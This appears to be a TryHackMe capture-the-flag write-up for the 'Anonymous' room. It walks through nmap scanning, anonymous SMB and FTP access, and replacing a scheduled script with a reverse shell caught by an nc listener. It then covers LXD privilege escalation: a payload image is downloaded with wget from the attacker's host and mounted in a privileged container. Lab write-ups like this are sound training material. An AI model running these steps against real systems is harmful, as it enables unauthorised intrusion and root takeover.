# Anonymous

**Room Link:** [https://tryhackme.com/room/anonymous](https://tryhackme.com/room/anonymous)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### **TCP/445  - SMB**

**Kali**

```
smbclient -L //$VICTIM/
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There were just two dog pics, probably not interesting.

**Kali**

```
mkdir loot
cd loot
smbclient \\\\$VICTIM\\pics
prompt
mget *
```



### TCP/21 - **FTP**

Login using anonymous and no pass

**Kali**

```
ftp $VICTIM 21
binary
passive
cd scripts
mget *
```

## Initial Shell

There were these 3 files

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I modified clean.sh to have a reverse shell back to my kali

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali #1**

```
nc -lvnp 1337
```

**Kali #2**

```
ftp $VICTIM 21
binary
passive
cd scripts
put clean.sh
```

After a few minutes the script was ran and I had a shell.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

<pre><code><strong>python -c 'import pty; pty.spawn("/bin/bash")'
</strong>ctrl + Z
stty raw -echo;fg
</code></pre>





## Privilege Escalation&#x20;

Followed this link on lxd privilege escalation&#x20;

**Link:** [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

**Victim**

```
id
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python2 -m SimpleHTTPServer 81
```

**Note:** The command lxd init was to resolve a storage pool area issue, it may not always be needed.

**Victim**

```
cd /tmp
wget http://$KALI/alpine-v3.18-x86_64-20231111_1929.tar.gz
lxc image import ./alpine-v3.18-x86_64-20231111_1929.tar.gz --alias myimage
lxd init
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```







